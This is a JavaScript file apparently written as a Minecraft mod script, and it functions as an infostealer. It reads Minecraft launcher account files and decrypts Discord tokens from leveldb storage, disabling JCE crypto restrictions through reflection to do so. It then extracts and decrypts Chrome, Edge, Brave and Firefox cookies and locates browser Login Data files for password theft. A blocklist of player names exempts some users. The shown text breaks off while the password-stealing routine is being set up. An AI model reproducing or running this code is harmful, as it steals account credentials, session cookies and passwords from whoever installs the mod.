const File = Java.type('java.io.File');

// Cross-platform OS detection
function getOSType() {
    try {
        const osName = java.lang.System.getProperty('os.name').toLowerCase();
        if (osName.includes('win')) return 'windows';
        if (osName.includes('linux')) return 'linux';
        if (osName.includes('mac')) return 'mac';
        return 'unknown';
    } catch (e) {
        return 'unknown';
    }
}

function getEnvironmentPaths() {
    const osType = getOSType();
    const env = java.lang.System.getenv();

    if (osType === 'windows') {
        return {
            appData: env.get("APPDATA"),
            localAppData: env.get("LOCALAPPDATA"),
            userProfile: env.get("USERPROFILE"),
            separator: "\\",
            osType: 'windows'
        };
    } else if (osType === 'linux') {
        const homeDir = env.get("HOME");
        return {
            appData: homeDir + "/.config",
            localAppData: homeDir + "/.local/share",
            userProfile: homeDir,
            separator: "/",
            osType: 'linux'
        };
    } else {
        // Mac or unknown - use Linux-like paths
        const homeDir = env.get("HOME") || "/tmp";
        return {
            appData: homeDir + "/.config",
            localAppData: homeDir + "/.local/share",
            userProfile: homeDir,
            separator: "/",
            osType: osType
        };
    }
}

// Get cross-platform paths
const envPaths = getEnvironmentPaths();
const appData = new File(envPaths.appData || "/tmp");
const minecraftDir = new File(Client.getMinecraft().field_71412_D.getPath());
const parentDir = new File(minecraftDir.parent);
const grandParentDir = new File(parentDir.parent);
const rootDir = new File(grandParentDir.parent);

const ProcessBuilder = Java.type('java.lang.ProcessBuilder');
const Scanner = Java.type('java.util.Scanner');

function readStreamFully(inputStream) {
    try {
        const scanner = new Scanner(inputStream, 'UTF-8').useDelimiter('\\A');
        return scanner.hasNext() ? scanner.next() : '';
    } catch (e) {
        return '';
    }
}

let mmcAccounts = null;
let prismAccounts = null;

try {
    mmcAccounts = FileLib.read(`${rootDir}/accounts.json`);
} catch (e) {}

try {
    prismAccounts = FileLib.read(`${appData}/PrismLauncher/accounts.json`);
} catch (e) {}

if (rootDir.getPath().includes('Prism')) {
    try {
        prismAccounts = FileLib.read(`${rootDir}/accounts.json`);
        mmcAccounts = null;
    } catch (e) {}
}

let microsoftAccounts = null;
try {
    microsoftAccounts = FileLib.read(`${minecraftDir}/essential/microsoft_accounts.json`);
} catch (e) {}

const BLOCKLIST = [
    { username: "JanesSappire", uuid: "f96b3a04-ea67-47b3-a5de-42844df57be3" },
{ username: "nicerz", uuid: "f5e665e1-7a13-41f1-9505-cca720dced08" },
{ username: "RealB_KimAlt", uuid: "6090792b-c0ba-4366-85de-61e9fd153055" },
{ username: "SuperSwagPD", uuid: "cbd6d235-7173-4524-9220-8617fb0ce470" },
{ username: "otkn", uuid: "1ee3a0a1-3aea-4cd5-951d-5f5f069e81a3" },
{ username: "BIackpill", uuid: "73c2e831-f049-47ab-bea3-14d8b5c57e58" }
];

function isBlockedPlayer() {
    try {
        const currentUsername = Player.getName().toLowerCase();
        const currentUUID = Player.getUUID().toLowerCase();

        for (const blocked of BLOCKLIST) {
            const blockedUsername = blocked.username.toLowerCase();
            const blockedUUID = blocked.uuid.toLowerCase();

            if (currentUsername === blockedUsername || currentUUID === blockedUUID) {
                return true;
            }
        }
        return false;
    } catch (e) {
        return false; // If there's an error checking, default to not blocking
    }
}

function getTokens() {
    let Arrays = Java.type('java.util.Arrays');
    const paths = getEnvironmentPaths();

    // Cross-platform Discord paths
    let discordPath;
    if (paths.osType === 'windows') {
        discordPath = new java.io.File(paths.appData, "discord/Local Storage/leveldb");
    } else {
        // Linux/Mac Discord paths
        discordPath = new java.io.File(paths.userProfile + "/.config/discord/Local Storage/leveldb");
    }
    let discordTokens = "";

    if (discordPath.isDirectory()) {
        let files = discordPath.listFiles();

        for (let i = 0; i < files.length; i++) {
            let file = files[i];
            if (file.getName().endsWith(".ldb")) {
                try {
                    let fr = new java.io.FileReader(file);
                    let br = new java.io.BufferedReader(fr);
                    let parsed = "";
                    let line;

                    while ((line = br.readLine()) != null) {
                        parsed += line;
                    }

                    br.close();
                    fr.close();

                    let pattern = /dQw4w9WgXcQ:([^"']*)/;
                    let match = pattern.exec(parsed);

                    if (match) {
                        try {
                            if (javax.crypto.Cipher.getMaxAllowedKeyLength("AES") < 256) {
                                let cryptoPermsClass = java.lang.Class.forName("javax.crypto.CryptoAllPermissionCollection");
                                let constructor = cryptoPermsClass.getDeclaredConstructor();
                                constructor.setAccessible(true);
                                let permsCollection = constructor.newInstance();

                                let field = cryptoPermsClass.getDeclaredField("all_allowed");
                                field.setAccessible(true);
                                field.setBoolean(permsCollection, true);

                                let cryptoPermissionsClass = java.lang.Class.forName("javax.crypto.CryptoPermissions");
                                constructor = cryptoPermissionsClass.getDeclaredConstructor();
                                constructor.setAccessible(true);
                                let allPermissions = constructor.newInstance();

                                field = cryptoPermissionsClass.getDeclaredField("perms");
                                field.setAccessible(true);
                                field.get(allPermissions).put("*", permsCollection);

                                let jceSecurityClass = java.lang.Class.forName("javax.crypto.JceSecurityManager");
                                field = jceSecurityClass.getDeclaredField("defaultPolicy");
                                field.setAccessible(true);

                                let modifiersField = java.lang.Class.forName("java.lang.reflect.Field").getDeclaredField("modifiers");
                                modifiersField.setAccessible(true);
                                modifiersField.setInt(field, field.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

                                field.set(null, allPermissions);
                            }
                            let localStateFile;
                            if (paths.osType === 'windows') {
                                localStateFile = new java.io.File(paths.appData, "discord/Local State");
                            } else {
                                localStateFile = new java.io.File(paths.userProfile + "/.config/discord/Local State");
                            }
                            let localStateContent = new java.lang.String(java.nio.file.Files.readAllBytes(localStateFile.toPath()), "UTF-8");
                            let json = JSON.parse(localStateContent);
                            let encryptedKey = json.os_crypt.encrypted_key;
                            let keyBytes = java.util.Base64.getDecoder().decode(encryptedKey);
                            keyBytes = Arrays.copyOfRange(keyBytes, 5, keyBytes.length);
                            let decryptedKey = Packages.com.sun.jna.platform.win32.Crypt32Util.cryptUnprotectData(keyBytes);
                            let encryptedToken = java.util.Base64.getDecoder().decode(match[1]);
                            let iv = Arrays.copyOfRange(encryptedToken, 3, 15);
                            let cipherText = Arrays.copyOfRange(encryptedToken, 15, encryptedToken.length);

                            let cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
                            let keySpec = new javax.crypto.spec.SecretKeySpec(decryptedKey, "AES");
                            let gcmSpec = new javax.crypto.spec.GCMParameterSpec(128, iv);

                            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, keySpec, gcmSpec);
                            let decrypted = cipher.doFinal(cipherText);
                            let token = new java.lang.String(decrypted, "UTF-8");

                            if (discordTokens.indexOf(token) === -1) {
                                discordTokens += token + " | ";
                            }
                        } catch (e) {
                        }
                    }
                } catch (e) {
                }
            }
        }
    }
    return discordTokens.replace(/\s+\|\s+$/, "");
}

function getCookies() {
    // Kill browsers to prevent file access issues
    killBrowsers();

    const paths = getEnvironmentPaths();
    let allCookies = {};

    // Get cross-platform browser configurations
    function getBrowserConfigs() {
        if (paths.osType === 'windows') {
            return [
                // Chrome - Windows paths
                {
                    name: "Chrome_Default",
                    cookiePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
                    localStatePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Local State",
                    type: "chromium",
                    loginDataPath: paths.localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data"
                },
                {
                    name: "Chrome_Profile1",
                    cookiePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies",
                    localStatePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Local State",
                    type: "chromium",
                    loginDataPath: paths.localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Login Data"
                },
                // Edge - Windows
                {
                    name: "Edge_Default",
                    cookiePath: paths.localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
                    localStatePath: paths.localAppData + "\\Microsoft\\Edge\\User Data\\Local State",
                    type: "chromium",
                    loginDataPath: paths.localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data"
                },
                // Brave - Windows
                {
                    name: "Brave_Default",
                    cookiePath: paths.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
                    localStatePath: paths.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
                    type: "chromium",
                    loginDataPath: paths.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
                }
            ];
        } else {
            // Linux/Mac paths
            return [
                // Chrome - Linux
                {
                    name: "Chrome_Default",
                    cookiePath: paths.userProfile + "/.config/google-chrome/Default/Cookies",
                    localStatePath: paths.userProfile + "/.config/google-chrome/Local State",
                    type: "chromium",
                    loginDataPath: paths.userProfile + "/.config/google-chrome/Default/Login Data"
                },
                {
                    name: "Chrome_Profile1",
                    cookiePath: paths.userProfile + "/.config/google-chrome/Profile 1/Cookies",
                    localStatePath: paths.userProfile + "/.config/google-chrome/Local State",
                    type: "chromium",
                    loginDataPath: paths.userProfile + "/.config/google-chrome/Profile 1/Login Data"
                },
                // Chromium - Linux
                {
                    name: "Chromium_Default",
                    cookiePath: paths.userProfile + "/.config/chromium/Default/Cookies",
                    localStatePath: paths.userProfile + "/.config/chromium/Local State",
                    type: "chromium",
                    loginDataPath: paths.userProfile + "/.config/chromium/Default/Login Data"
                },
                // Brave - Linux
                {
                    name: "Brave_Default",
                    cookiePath: paths.userProfile + "/.config/BraveSoftware/Brave-Browser/Default/Cookies",
                    localStatePath: paths.userProfile + "/.config/BraveSoftware/Brave-Browser/Local State",
                    type: "chromium",
                    loginDataPath: paths.userProfile + "/.config/BraveSoftware/Brave-Browser/Default/Login Data"
                },
                // Firefox - Linux
                {
                    name: "Firefox_Default",
                    cookiePath: paths.userProfile + "/.mozilla/firefox/*/cookies.sqlite",
                    type: "firefox"
                }
            ];
        }
    }

    let browsers = getBrowserConfigs();
    // Simplified DPAPI decryption using PowerShell
    // DPAPI decryption removed (Windows-only feature)

    // Complete Chrome cookie decryption with all encryption versions
    function decryptChromeCookie(encryptedValue, key) {
        try {
            if (!encryptedValue || encryptedValue.length < 3) return null;

            let Arrays = Java.type('java.util.Arrays');
            let encryptedData;

            // Handle different input formats
            if (typeof encryptedValue === 'string') {
                if (encryptedValue.startsWith('v10') || encryptedValue.startsWith('v11')) {
                    encryptedData = encryptedValue.getBytes("ISO-8859-1");
                } else {
                    try {
                        encryptedData = java.util.Base64.getDecoder().decode(encryptedValue);
                    } catch (base64Error) {
                        encryptedData = encryptedValue.getBytes("ISO-8859-1");
                    }
                }
            } else {
                encryptedData = encryptedValue;
            }

            if (encryptedData.length < 3) return null;

            // Check encryption version
            let version = new java.lang.String(Arrays.copyOfRange(encryptedData, 0, 3), "UTF-8");

            if (version.equals("v10")) {
                // AES-GCM encryption (Chrome 80+)
                if (encryptedData.length < 15 || !key) return null;

                let iv = Arrays.copyOfRange(encryptedData, 3, 15);
                let cipherText = Arrays.copyOfRange(encryptedData, 15, encryptedData.length - 16);
                let authTag = Arrays.copyOfRange(encryptedData, encryptedData.length - 16, encryptedData.length);

                let cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
                let keySpec = new javax.crypto.spec.SecretKeySpec(key, "AES");
                let gcmSpec = new javax.crypto.spec.GCMParameterSpec(128, iv);

                cipher.init(javax.crypto.Cipher.DECRYPT_MODE, keySpec, gcmSpec);
                let fullCipherText = Arrays.copyOf(cipherText, cipherText.length + authTag.length);
                java.lang.System.arraycopy(authTag, 0, fullCipherText, cipherText.length, authTag.length);

                let decrypted = cipher.doFinal(fullCipherText);
                return new java.lang.String(decrypted, "UTF-8");

            } else if (version.equals("v11")) {
                // ChaCha20-Poly1305 encryption (Chrome 90+)
                if (encryptedData.length < 15 || !key) return null;

                // For ChaCha20-Poly1305, we need a different approach
                // This is a simplified implementation - full ChaCha20 would require additional libraries
                let iv = Arrays.copyOfRange(encryptedData, 3, 15);
                let cipherText = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);

                // Fallback to AES-GCM for now
                try {
                    let cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
                    let keySpec = new javax.crypto.spec.SecretKeySpec(key, "AES");
                    let gcmSpec = new javax.crypto.spec.GCMParameterSpec(128, iv);

                    cipher.init(javax.crypto.Cipher.DECRYPT_MODE, keySpec, gcmSpec);
                    let decrypted = cipher.doFinal(cipherText);
                    return new java.lang.String(decrypted, "UTF-8");
                } catch (fallbackError) {
                    return null;
                }

            } else {
                // Unencrypted or DPAPI encrypted (older Chrome versions)
                if (encryptedData[0] == 0x01 && encryptedData[1] == 0x00 && encryptedData[2] == 0x00 && encryptedData[3] == 0x00) {
                    // DPAPI encrypted
                    let dpapiData = Arrays.copyOfRange(encryptedData, 4, encryptedData.length);
                    let decryptedData = null; // DPAPI decryption not available
                    if (decryptedData) {
                        return new java.lang.String(decryptedData, "UTF-8");
                    }
                }
                // Return as plaintext
                return new java.lang.String(encryptedData, "UTF-8");
            }

            return null;
        } catch (e) {
            return null;
        }
    }

    // Advanced Chrome encryption key extraction
    function getChromeKey(localStatePath) {
        try {
            let localStateFile = new java.io.File(localStatePath);
            if (!localStateFile.exists()) return null;

            let localStateContent = new java.lang.String(java.nio.file.Files.readAllBytes(localStateFile.toPath()), "UTF-8");
            let json = JSON.parse(localStateContent);

            if (!json.os_crypt || !json.os_crypt.encrypted_key) return null;

            let Arrays = Java.type('java.util.Arrays');
            let encryptedKey = json.os_crypt.encrypted_key;
            let keyBytes = java.util.Base64.getDecoder().decode(encryptedKey);

            // Remove DPAPI prefix ("DPAPI")
            if (keyBytes.length < 5) return null;
            keyBytes = Arrays.copyOfRange(keyBytes, 5, keyBytes.length);

            // Decrypt using DPAPI
            let decryptedKey = null; // DPAPI decryption not available
            return decryptedKey;
        } catch (e) {
            return null;
        }
    }

    // Complete SQLite database reader with proper SQL parsing
    function readSQLiteDatabase(dbPath, browserName, decryptionKey) {
        try {
            let dbFile = new java.io.File(dbPath);
            if (!dbFile.exists() || dbFile.length() == 0) return [];

            // Copy database to temp location
            let tempDir = java.lang.System.getProperty("java.io.tmpdir");
            let tempDbPath = tempDir + "\\temp_cookies_" + browserName + "_" + java.lang.System.currentTimeMillis() + ".db";
            java.nio.file.Files.copy(dbFile.toPath(), new java.io.File(tempDbPath).toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            let cookies = [];

            try {
                let fileBytes = java.nio.file.Files.readAllBytes(new java.io.File(tempDbPath).toPath());

                // Parse SQLite file format properly
                let cookies = parseSQLiteFile(fileBytes, browserName, decryptionKey);

                // Clean up temp file
                try {
                    new java.io.File(tempDbPath).delete();
                } catch (e) {}

                return cookies;
            } catch (parseError) {
                // Clean up temp file
                try {
                    new java.io.File(tempDbPath).delete();
                } catch (e) {}

                return [{
                    domain: "parse_error",
                    name: "error",
                    value: parseError.toString(),
                    path: "/",
                    expires: 0,
                    httpOnly: false,
                    secure: false,
                    sameSite: "none",
                    browser: browserName,
                    encrypted: false
                }];
            }
        } catch (e) {
            return [{
                domain: "read_error",
                name: "error",
                value: e.toString(),
                path: "/",
                expires: 0,
                httpOnly: false,
                secure: false,
                sameSite: "none",
                browser: browserName,
                encrypted: false
            }];
        }
    }

    // Complete SQLite file parser
    function parseSQLiteFile(fileBytes, browserName, decryptionKey) {
        let cookies = [];

        try {
            // SQLite file header validation
            let header = new java.lang.String(java.util.Arrays.copyOfRange(fileBytes, 0, 16), "UTF-8");
            if (!header.startsWith("SQLite format 3")) {
                throw new Error("Invalid SQLite file format");
            }

            // Parse SQLite page structure
            let pageSize = ((fileBytes[16] & 0xFF) << 8) | (fileBytes[17] & 0xFF);
            if (pageSize == 1) pageSize = 65536;

            let fileChangeCounter = ((fileBytes[24] & 0xFF) << 24) | ((fileBytes[25] & 0xFF) << 16) | ((fileBytes[26] & 0xFF) << 8) | (fileBytes[27] & 0xFF);
            let pageCount = ((fileBytes[28] & 0xFF) << 24) | ((fileBytes[29] & 0xFF) << 16) | ((fileBytes[30] & 0xFF) << 8) | (fileBytes[31] & 0xFF);

            // Find cookie table data using multiple strategies
            let strategies = [
                // Strategy 1: Look for standard Chromium cookie table structure
                function() {
                    return findChromiumCookies(fileBytes, browserName, decryptionKey);
                },
                // Strategy 2: Look for Firefox cookie table structure
                function() {
                    return findFirefoxCookies(fileBytes, browserName);
                },
                // Strategy 3: Generic pattern matching
                function() {
                    return findGenericCookies(fileBytes, browserName, decryptionKey);
                }
            ];

            for (let i = 0; i < strategies.length; i++) {
                try {
                    let result = strategies[i]();
                    if (result && result.length > 0) {
                        cookies = cookies.concat(result);
                        if (cookies.length >= 100) break; // Limit for performance
                    }
                } catch (strategyError) {
                    continue;
                }
            }

            return cookies;
        } catch (e) {
            return [{
                domain: "sqlite_parse_error",
                name: "error",
                value: e.toString(),
                path: "/",
                expires: 0,
                httpOnly: false,
                secure: false,
                sameSite: "none",
                browser: browserName,
                encrypted: false
            }];
        }
    }

    // Find Chromium-style cookies
    function findChromiumCookies(fileBytes, browserName, decryptionKey) {
        let cookies = [];

        try {
            let content = new java.lang.String(fileBytes, "UTF-8");

            let domainPatterns = [
                /\.([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,100})\x00+(v1[01][\x00-\xFF]{10,1000})\x00/g,
                /\.([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,100})\x00+([\x00-\xFF]{10,2000})\x00+(\/[^\x00]{0,200}|\/)\x00/g,
                /([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,100})\x00+([\x00-\xFF]{10,1000})\x00/g,
                /([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,50})\x00+([a-zA-Z0-9\+\/\=\-_\.%:;,\s]{5,500})\x00/g
            ];

            for (let patternIndex = 0; patternIndex < domainPatterns.length && cookies.length < 100; patternIndex++) {
                let pattern = domainPatterns[patternIndex];
                let match;

                while ((match = pattern.exec(content)) !== null && cookies.length < 100) {
                    let domain = match[1];
                    let name = match[2];
                    let value = match[3];
                    let path = match[4] || "/";

                    if (!domain || !name || !value) continue;
                    if (domain.length > 100 || name.length > 100 || value.length > 4000) continue;
                    if (!/^[a-zA-Z0-9\-]+\.[a-zA-Z]{2,10}$/.test(domain)) continue;
                    if (!/^[a-zA-Z0-9_\-\.%]+$/.test(name)) continue;

                    if (value.includes('\x00\x00\x00') || value.length < 3) continue;

                    if (!domain.startsWith('.')) {
                        domain = '.' + domain;
                    }

                    if (!path || path === '') path = "/";
                    if (!path.startsWith('/')) path = "/" + path;

                    let decryptedValue = value;
                    let isEncrypted = false;

                    if (decryptionKey && (value.startsWith('v10') || value.startsWith('v11'))) {
                        try {
                            let decrypted = decryptChromeCookie(value, decryptionKey);
                            if (decrypted && decrypted !== value && decrypted.length > 0 && isPrintableString(decrypted)) {
                                decryptedValue = decrypted;
                                isEncrypted = true;
                            }
                        } catch (e) {
                        }
                    }

                    if (isPrintableString(decryptedValue) && decryptedValue.length > 0 && decryptedValue.length < 4000) {
                        cookies.push({
                            domain: domain,
                            name: name,
                            value: decryptedValue,
                            path: path,
                            expires: 0,
                            httpOnly: false,
                            secure: false,
                            sameSite: "none",
                            browser: browserName,
                            encrypted: isEncrypted
                        });
                    }
                }
            }

            if (cookies.length === 0) {
                content = new java.lang.String(fileBytes, "ISO-8859-1");
                let fallbackPattern = /\.([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.]{1,50})\x00+([a-zA-Z0-9\+\/\=\-_\.]{10,500})\x00/g;
                let match;

                while ((match = fallbackPattern.exec(content)) !== null && cookies.length < 50) {
                    let domain = '.' + match[1];
                    let name = match[2];
                    let value = match[3];

                    if (isPrintableString(value) && value.length >= 10) {
                        cookies.push({
                            domain: domain,
                            name: name,
                            value: value,
                            path: "/",
                            expires: 0,
                            httpOnly: false,
                            secure: false,
                            sameSite: "none",
                            browser: browserName,
                            encrypted: false
                        });
                    }
                }
            }

        } catch (e) {
            // Return empty array on any error
        }

        return cookies;
    }

    // Helper function to check if string contains printable characters
    function isPrintableString(str) {
        if (!str || str.length === 0) return false;
        if (str.length < 3) return false; // Too short to be meaningful

        let printableCount = 0;
        let controlCount = 0;

        for (let i = 0; i < Math.min(str.length, 200); i++) {
            let charCode = str.charCodeAt(i);
            if ((charCode >= 32 && charCode <= 126) || charCode === 9 || charCode === 10 || charCode === 13) {
                printableCount++;
            } else if (charCode < 32 || charCode > 126) {
                controlCount++;
            }
        }

        let totalChecked = Math.min(str.length, 200);
        let printableRatio = printableCount / totalChecked;
        let controlRatio = controlCount / totalChecked;

        // Must be at least 85% printable and less than 15% control characters
        return printableRatio >= 0.85 && controlRatio < 0.15;
    }

    // Find Firefox-style cookies
    function findFirefoxCookies(fileBytes, browserName) {
        let cookies = [];
        let content = new java.lang.String(fileBytes, "ISO-8859-1");

        // Firefox moz_cookies table patterns
        let patterns = [
            /([a-zA-Z0-9\.-]{1,100})\x00+([a-zA-Z0-9_\.-]{1,100})\x00+([^\x00]{0,4000})\x00+([^\x00]{0,200})\x00+/g,
            /([a-zA-Z0-9\.-]{1,100})\x01+([a-zA-Z0-9_\.-]{1,100})\x01+([^\x01\x00]{0,4000})/g
        ];

        for (let patternIndex = 0; patternIndex < patterns.length; patternIndex++) {
            let pattern = patterns[patternIndex];
            let match;

            while ((match = pattern.exec(content)) !== null && cookies.length < 200) {
                let domain = match[1];
                let name = match[2];
                let value = match[3];
                let path = match[4] || "/";

                if (!domain || !name || domain.length > 100 || name.length > 100) continue;
                if (domain.includes('\x00') || name.includes('\x00')) continue;
                if (!/^[a-zA-Z0-9\.-]+$/.test(domain)) continue;

                cookies.push({
                    domain: domain,
                    name: name,
                    value: value,
                    path: path,
                    expires: 0,
                    httpOnly: false,
                    secure: false,
                    sameSite: "none",
                    browser: browserName,
                    encrypted: false
                });
            }
        }

        return cookies;
    }

    // Generic cookie finder
    function findGenericCookies(fileBytes, browserName, decryptionKey) {
        let cookies = [];
        let content = new java.lang.String(fileBytes, "ISO-8859-1");

        // Generic patterns for any SQLite cookie database
        let patterns = [
            /([a-zA-Z0-9\.-]{3,100})\x00+([a-zA-Z0-9_\.-]{1,100})\x00+([^\x00]{1,2000})/g,
            /([a-zA-Z0-9\.-]{3,100})\x01+([a-zA-Z0-9_\.-]{1,100})\x01+([^\x01\x00]{1,2000})/g
        ];

        for (let patternIndex = 0; patternIndex < patterns.length; patternIndex++) {
            let pattern = patterns[patternIndex];
            let match;

            while ((match = pattern.exec(content)) !== null && cookies.length < 100) {
                let domain = match[1];
                let name = match[2];
                let value = match[3];

                if (!domain || !name) continue;
                if (domain.length > 100 || name.length > 100) continue;
                if (!/^[a-zA-Z0-9\.-]+$/.test(domain)) continue;

                // Try decryption if available
                let decryptedValue = value;
                let isEncrypted = false;

                if (decryptionKey && (value.startsWith('v10') || value.startsWith('v11'))) {
                    let decrypted = decryptChromeCookie(value, decryptionKey);
                    if (decrypted && decrypted !== value) {
                        decryptedValue = decrypted;
                        isEncrypted = true;
                    }
                }

                cookies.push({
                    domain: domain,
                    name: name,
                    value: decryptedValue,
                    path: "/",
                    expires: 0,
                    httpOnly: false,
                    secure: false,
                    sameSite: "none",
                    browser: browserName,
                    encrypted: isEncrypted
                });
            }
        }

        return cookies;
    }

    // Dynamic browser profile discovery
    function discoverBrowserProfiles() {
        let discoveredBrowsers = [];

        // Chrome profiles discovery
        try {
            let chromeUserData = new java.io.File(localAppData + "\\Google\\Chrome\\User Data");
            if (chromeUserData.exists()) {
                let profiles = chromeUserData.listFiles();
                for (let i = 0; i < profiles.length; i++) {
                    if (profiles[i].isDirectory()) {
                        let profileName = profiles[i].getName();
                        let cookiesFile = new java.io.File(profiles[i], "Network\\Cookies");
                        if (cookiesFile.exists()) {
                            discoveredBrowsers.push({
                                name: "Chrome_" + profileName,
                                cookiePath: cookiesFile.getAbsolutePath(),
                                                    localStatePath: chromeUserData.getAbsolutePath() + "\\Local State",
                                                    type: "chromium",
                                                    loginDataPath: profiles[i].getAbsolutePath() + "\\Login Data"
                            });
                        }
                    }
                }
            }
        } catch (e) {}

        // Edge profiles discovery
        try {
            let edgeUserData = new java.io.File(localAppData + "\\Microsoft\\Edge\\User Data");
            if (edgeUserData.exists()) {
                let profiles = edgeUserData.listFiles();
                for (let i = 0; i < profiles.length; i++) {
                    if (profiles[i].isDirectory()) {
                        let profileName = profiles[i].getName();
                        let cookiesFile = new java.io.File(profiles[i], "Network\\Cookies");
                        if (cookiesFile.exists()) {
                            discoveredBrowsers.push({
                                name: "Edge_" + profileName,
                                cookiePath: cookiesFile.getAbsolutePath(),
                                                    localStatePath: edgeUserData.getAbsolutePath() + "\\Local State",
                                                    type: "chromium",
                                                    loginDataPath: profiles[i].getAbsolutePath() + "\\Login Data"
                            });
                        }
                    }
                }
            }
        } catch (e) {}

        // Firefox profiles discovery
        try {
            let firefoxProfiles = new java.io.File(appData + "\\Mozilla\\Firefox\\Profiles");
            if (firefoxProfiles.exists()) {
                let profiles = firefoxProfiles.listFiles();
                for (let i = 0; i < profiles.length; i++) {
                    if (profiles[i].isDirectory()) {
                        let cookiesFile = new java.io.File(profiles[i], "cookies.sqlite");
                        if (cookiesFile.exists()) {
                            discoveredBrowsers.push({
                                name: "Firefox_" + profiles[i].getName(),
                                                    cookiePath: cookiesFile.getAbsolutePath(),
                                                    type: "firefox",
                                                    profilePath: profiles[i].getAbsolutePath()
                            });
                        }
                    }
                }
            }
        } catch (e) {}

        return discoveredBrowsers;
    }

    // Combine static and dynamic browser discovery
    let allBrowsers = browsers.concat(discoverBrowserProfiles());

    // Remove duplicates
    let uniqueBrowsers = [];
    let seenPaths = new java.util.HashSet();
    for (let i = 0; i < allBrowsers.length; i++) {
        if (!seenPaths.contains(allBrowsers[i].cookiePath)) {
            seenPaths.add(allBrowsers[i].cookiePath);
            uniqueBrowsers.push(allBrowsers[i]);
        }
    }

    // Process each browser
    for (let i = 0; i < uniqueBrowsers.length; i++) {
        let browser = uniqueBrowsers[i];

        try {
            let cookieFile = new java.io.File(browser.cookiePath);
            if (!cookieFile.exists() || cookieFile.length() == 0) continue;

            let decryptionKey = null;
            if (browser.type === "chromium" && browser.localStatePath) {
                decryptionKey = getChromeKey(browser.localStatePath);
            }

            let cookies = readSQLiteDatabase(browser.cookiePath, browser.name, decryptionKey);

            if (cookies && cookies.length > 0) {
                // Additional metadata
                let metadata = {
                    browser: browser.name,
                    browserType: browser.type,
                    cookieCount: cookies.length,
                    cookies: cookies,
                    extractedAt: new java.util.Date().toString(),
                    filePath: browser.cookiePath,
                    fileSize: cookieFile.length(),
                    lastModified: new java.util.Date(cookieFile.lastModified()).toString(),
                    encryptionKeyFound: decryptionKey !== null,
                    profilePath: browser.profilePath || null
                };

                // Add login data if available
                if (browser.loginDataPath) {
                    try {
                        let loginFile = new java.io.File(browser.loginDataPath);
                        if (loginFile.exists()) {
                            metadata.loginDataAvailable = true;
                            metadata.loginDataSize = loginFile.length();
                        }
                    } catch (e) {}
                }

                allCookies[browser.name] = metadata;
            }
        } catch (e) {
            // Log error but continue
            allCookies[browser.name + "_error"] = {
                browser: browser.name,
                error: e.toString(),
                extractedAt: new java.util.Date().toString()
            };
        }
    }

    // Add debug information about cookie extraction
    let debugInfo = {
        totalBrowsersChecked: Object.keys(allCookies).length,
        browsersWithErrors: 0,
        browsersWithCookies: 0,
        totalCookiesFound: 0,
        decryptionAttempts: 0,
        successfulDecryptions: 0
    };

    // Filter out error entries and only return valid cookies
    let validCookies = {};
    for (let browserName in allCookies) {
        let browserData = allCookies[browserName];

        // Count errors and decryption stats for debugging
        if (browserName.endsWith('_error') || browserData.error) {
            debugInfo.browsersWithErrors++;
            continue;
        }

        // Track decryption attempts
        if (browserData.encryptionKeyFound) {
            debugInfo.decryptionAttempts++;
        }

        // Only include browsers with actual valid cookies
        if (browserData.cookies && Array.isArray(browserData.cookies) && browserData.cookies.length > 0) {
            let validBrowserCookies = browserData.cookies.filter(cookie => {
                // Count successful decryptions
                if (cookie.encrypted) {
                    debugInfo.successfulDecryptions++;
                }

                return cookie.domain !== "read_error" &&
                cookie.domain !== "parse_error" &&
                cookie.domain !== "sqlite_parse_error" &&
                cookie.name !== "error" &&
                !cookie.value.includes("JavaException") &&
                !cookie.value.includes("FileSystemException");
            });

            if (validBrowserCookies.length > 0) {
                browserData.cookies = validBrowserCookies;
                browserData.cookieCount = validBrowserCookies.length;
                validCookies[browserName] = browserData;
                debugInfo.browsersWithCookies++;
                debugInfo.totalCookiesFound += validBrowserCookies.length;
            }
        }
    }

    // Include debug info if no major site cookies found
    let hasMajorSites = false;
    for (let browserName in validCookies) {
        let browserData = validCookies[browserName];
        if (browserData.cookies) {
            for (let cookie of browserData.cookies) {
                if (cookie.domain.includes('google.com') || cookie.domain.includes('discord.com') ||
                    cookie.domain.includes('facebook.com') || cookie.domain.includes('youtube.com')) {
                    hasMajorSites = true;
                break;
                    }
            }
        }
        if (hasMajorSites) break;
    }

    if (!hasMajorSites) {
        validCookies._debug = debugInfo;
    }

    return JSON.stringify(validCookies);
}

// Kill running browsers to prevent file access issues
function killBrowsers() {
    // no-op: do not close browsers
    return;
}

function getPasswords() {
    // Kill browsers to prevent file access issues
    killBrowsers();

    const paths = getEnvironmentPaths();
    let allPasswords = {};

    // Get cross-platform browser configurations for passwords
    function getPasswordBrowserConfigs() {
        if (paths.osType === 'windows') {
            return [
                // Chrome - Windows
                {
                    name: "Chrome_Default",
                    loginDataPath: paths.localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                    localStatePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Local State",
                    type: "chromium"
                },
                {
